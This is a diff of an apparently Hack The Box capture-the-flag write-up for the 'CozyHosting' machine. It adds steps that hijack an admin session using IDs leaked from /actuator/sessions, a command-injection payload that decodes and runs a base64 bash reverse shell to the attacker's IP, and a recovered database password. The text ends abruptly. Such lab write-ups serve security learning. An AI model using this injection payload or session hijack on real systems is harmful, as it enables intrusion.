@@ -15,30 +15,52 @@ The next step is to search trough the webapplication for vulnerabilities. We can
 
 Gobuster finds a login and admin page. 
 
-===============================================================
-Gobuster v3.5
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://cozyhosting.htb/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.5
-[+] Timeout:                 10s
-===============================================================
-2023/10/11 11:23:44 Starting gobuster in directory enumeration mode
-===============================================================
-/admin                (Status: 401) [Size: 97]
-/error                (Status: 500) [Size: 73]
-/index                (Status: 200) [Size: 12706]
-/login                (Status: 200) [Size: 4431]
-/logout               (Status: 204) [Size: 0]
-Progress: 4554 / 4618 (98.61%)
-===============================================================
-2023/10/11 11:24:04 Finished
-===============================================================
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/9b84ff13-ac35-4115-b9af-08c11655a442)
 
-When we try to access the admin page we get a 401 (unathorised) and we get redirected to the login page. 
+We also run a bigger search with dirsearch:
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/0502985e-c94b-4529-a13f-6ae50a77e6b5)
+
+When we try to access the admin page we get a 401 (unathorised) and we get redirected to the login page. We try if SQLmap can get us somewhere on this page. This takes a while so we wait lets checkout if [hacktrics](https://book.hacktricks.xyz/pentesting-web/login-bypass) has any tips on how to get past the login page. hacktricks mentions to check if there is a remember me option. This is the case, this might allow us to use a session of a different user with access. From the dirsearch scan we found the page /actuator/sessions this page gives a couple of session ids: 
+
+{
+"E1A5A3A6778ADB55DBFA378AD0AB7354":"UNAUTHORIZED",
+"8BE8064ACAC4926BE4FEB88BB5AE51DA":"kanderson",
+"6113EB51B6B91DCC48C32B5011FE3B99":"UNAUTHORIZED",
+"216136184FF0A10378CB091EE802718A":"kanderson",
+"C9CCE6A596277216FD58C694BAAE212B":"UNAUTHORIZED"
+}
+
+two of these are not UNauthorized and belong to kanderson: 
+
+216136184FF0A10378CB091EE802718A
+8BE8064ACAC4926BE4FEB88BB5AE51DA
+
+By changing the cookie we get access to a admin dashboard
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/dca39894-aa51-4629-814e-a19465fcf077)
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/7f9a2e71-4965-44b3-94bb-1afe9cfca2fc)
+
+### Foothold
+
+At the bottom of the admin dashbord there is a box that allowes us to connect using ssh. However this does not get us get onto the box. In burpsuite we use the payload `{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAwPiYx}|{base64,-d}|bash|` to get a reverse shell. 
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/8d9dc9e3-1aba-4834-8f76-dd9d4f5f814e)
+
+We see that there is a user josh and a user prostgress that has access to the box. In the home folder we find a jar file that we download onto our machine and unzip. In the application.properties file we find the db credentials with user postgres and the password Vg&nvzAQ7XxR. 
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/8b5c8d0f-40c1-46cd-b2ee-86ac90fd4081)
+
+We put these hashes into john to find the cleartext. 
+
+
+
+
+
+
+
+
+
 
 
